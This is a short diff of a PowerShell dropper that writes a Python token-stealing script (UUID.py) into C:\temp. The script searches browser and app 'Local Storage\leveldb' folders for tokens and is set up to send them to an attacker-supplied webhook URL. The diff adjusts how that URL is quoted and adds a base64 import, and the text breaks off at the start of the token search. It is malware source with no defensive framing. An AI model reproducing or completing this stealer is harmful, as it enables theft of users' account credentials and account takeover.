@@ -1,14 +1,15 @@
+
+$webHookUrlPYTHON="'"+$webHookUrl+"'"
 New-Item "C:\temp" -Type Directory
 cls
 cd C:/temp
 Set-Content UUID.py "
-
-
 import os
 import re
 import json
+import base64
 from urllib.request import Request, urlopen
-WEBHOOK_URL = $webHookUrl
+WEBHOOK_URL = $webHookUrlPYTHON
 PING_ME = False
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
